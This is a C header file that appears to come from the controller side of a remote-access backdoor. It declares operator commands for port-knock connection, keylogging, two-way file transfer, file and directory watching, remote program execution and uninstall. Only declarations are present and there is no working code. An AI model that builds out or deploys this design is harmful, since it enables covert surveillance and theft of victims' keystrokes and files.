#ifndef MENU_H
#define MENU_H

#include "fsm.h"
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <linux/input.h>
#include <pthread.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>

typedef enum
{
    CONNECT,
    DISCONNECT,
    UNINSTALL,
    START_KEYLOG,
    STOP_KEYLOG,
    TRANSFER_FILE_TO,
    TRANSFER_FILE_FROM,
    WATCH_FILE,
    WATCH_DIR,
    RUN_PROGRAM
} menu_option;

typedef struct
{
    ip_info ip_ctx;
} receiver_args_t;

menu_option menu_get_selection(int connected);

int port_knock(struct ip_info *ip_ctx);
int disconnect(struct ip_info ip_ctx);
int uninstall(struct ip_info ip_ctx);
int start_keylogger(struct ip_info ip_ctx);
int stop_keylogger(struct ip_info ip_ctx);
int transfer_file(struct ip_info ip_ctx);
int request_file(struct ip_info ip_ctx);
int watch_file(struct ip_info ip_ctx);
int watch_directory(struct ip_info ip_ctx);
int run_program(struct ip_info ip_ctx);

#endif // MENU_H
